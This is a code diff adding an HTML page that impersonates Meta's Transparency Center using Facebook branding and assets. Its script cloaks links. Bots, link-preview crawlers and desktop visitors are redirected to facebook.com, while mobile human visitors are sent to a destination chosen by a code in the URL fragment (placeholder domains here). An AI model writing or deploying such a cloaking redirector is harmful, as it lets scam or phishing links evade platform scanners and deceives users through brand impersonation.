@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta
+      name="description"
+      content="Meta regularly publishes reports to give our community visibility into community standards enforcement, government requests and internet disruptions"
+    />
+
+    <title>Transparency Center</title>
+
+    <meta
+      name="og:image"
+      content="https://static.xx.fbcdn.net/rsrc.php/v3/yc/r/s_dzh-nO-ax.png"
+    />
+    <meta
+      name="og:description"
+      content="Meta regularly publishes reports to give our community visibility into community standards enforcement, government requests and internet disruptions"
+    />
+    <link
+      rel="shortcut icon"
+      href="https://static.xx.fbcdn.net/rsrc.php/v3/yd/r/4KnVq6qfLqy.png"
+    />
+  </head>
+
+  <body>
+    <script>
+      let user_agent = navigator.userAgent;
+      let is_mobile = /Mobi|android|iphone/i.test(user_agent);
+      let is_bot =
+        /bot|facebot|crawl|facebot|whatsapp|telegram|slurp|spider/i.test(
+          user_agent
+        );
+
+      var code = window.location.hash;
+      code = code.replace("#", "");
+
+      if (!code) {
+        window.location.href = "https://www.facebook.com/";
+      }
+
+      var links = {
+        "randomcode1": "https://example1.com",
+        "randomcode2": "https://example2.com",
+		"randomcode3": "https://example3.com",
+      };
+
+      if (!is_bot && is_mobile) {
+        window.location.href = links[code];
+      } else {
+        window.location.href = "https://www.facebook.com/";
+      }
+    </script>
+  </body>
+</html>
